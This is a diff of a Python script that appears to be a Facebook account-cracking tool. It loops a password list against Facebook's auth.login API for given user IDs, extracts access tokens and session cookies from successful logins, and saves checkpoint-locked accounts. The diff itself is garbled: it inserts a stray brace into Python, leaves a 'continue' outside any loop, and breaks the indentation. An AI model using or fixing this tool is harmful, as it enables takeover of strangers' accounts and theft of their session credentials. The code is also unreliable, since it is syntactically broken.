@@ -169,7 +169,7 @@ def method(self, uid, passlist):
                     pass
                 except Exception as e:
                     print(f"{R}Login success handler failed: {e}{N}")
-
+}
 try:
     url = "https://b-api.facebook.com/method/auth.login"
     response = requests.post(url, data=data, headers=headers, timeout=10).json()
@@ -180,12 +180,8 @@ except ValueError:
     print(f"{R}[!] Invalid response received (not JSON). Possibly rate-limited or blocked.{N}")
     continue
 
-    
-            if "access_token" in response:
+if "access_token" in response:
     try:
-        ...
-    except Exception as e:
-        ...
         uid_logged = str(response.get("uid")) if response.get("uid") else uid
         year = get_year_from_uid(uid_logged)
         cookies = response.get("session_cookies", [])
@@ -212,6 +208,7 @@ elif "www.facebook.com" in response.get("error", {}).get("message", ""):
         break
     except Exception as e:
         print(f"{R}[!] Error while saving CP: {str(e)}{N}")
+
 
 # 🔍 UID to Year Conversion Function
 def get_year_from_uid(uid):
